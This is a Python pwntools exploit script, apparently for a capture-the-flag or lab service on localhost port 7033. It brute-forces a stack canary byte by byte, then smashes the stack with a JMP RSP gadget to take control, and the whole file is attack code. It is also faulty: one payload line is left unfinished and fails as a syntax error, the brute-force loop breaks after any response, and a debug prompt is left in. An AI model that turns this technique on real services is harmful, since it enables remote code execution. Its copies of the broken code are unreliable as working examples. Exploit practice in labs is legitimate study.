from pwn import *

# Set the target host and port
target_host = '127.0.0.1'
target_port = 7033

JMP_RSP = 0x004014c5
COOKIE_LENGTH = 8
cookie = b''

guesses = [bytes([each_value]) for each_value in range(256) if each_value != 10]

#
# Step 1: bruteforce cookie
#
for each_byte in range(COOKIE_LENGTH):
    for each_hex in range(256):
    
        #
        # For debugging, remove when done
        #
        

        try:
            a = input("[*] Any Number to Continue: ")
        except KeyboardInterrupt:
            pass  # Handle Ctrl+C gracefully.
        

        #
        # END DEBUGGING
        #

        # Connect to the target
        p = remote(target_host, target_port)
        
        # Receive and print the initial message from the server
        initial_message = p.recvline()
        print(f"\n[*] Received initial message: {initial_message.decode()}")
        
        # Send payload when prompted for name
        payload = b"A" * 24 + cookie + guesses[each_hex]
        print(f"[*] Sending Payload: {payload}")
        p.sendline(payload)  # Send the payload
        
        try:
            response = p.recvline(timeout=10)

            # If guess is correct, add to the cookie
            if response == b"You may pass.\n":
                print(f"[*] Received response: {response.decode()}\n")
                cookie = cookie + guesses[each_hex]
                print(f"Byte {each_byte} Found: {guesses[each_hex]}")
                print(f"Cookie: {cookie}\n\n")
            # Close the connection
            p.close()
            break #move to next byte
            
        except EOFError:
            # Stack smashing detected: byte wrong
            print("[*] Connection closed prematurely")
            # Close the connection
            p.close()
            continue  # Move to the next guess

        except Exception as err:
            # Handle other exceptions (timeout, etc.)
            print("[*] Exception:", err)
            p.close()
            continue  # Move to the next guess

#
# Step 2: prepare payload and overwrite the stack
#

# Connect to the target
p = remote(target_host, target_port)

# Receive and print the initial message from the server
initial_message = p.recvline()
print(f"\n[*] Received initial message: {initial_message.decode()}")

# Send payload when prompted for name
payload = b"A" * 24 + cookie + 
print(f"[*] Sending Payload: {payload}")
p.sendline(payload)  # Send the payload

p.sendline(b'2') #select option (2) Change restaurant name
#payload format (buffer + cookie + rbp + return address)
payload = b"A"*24 + cookie + b"B"*8 + p64(JMP_RSP)
p.sendline(payload)       # Send the payload
# Start Interactive Session
p.interactive()
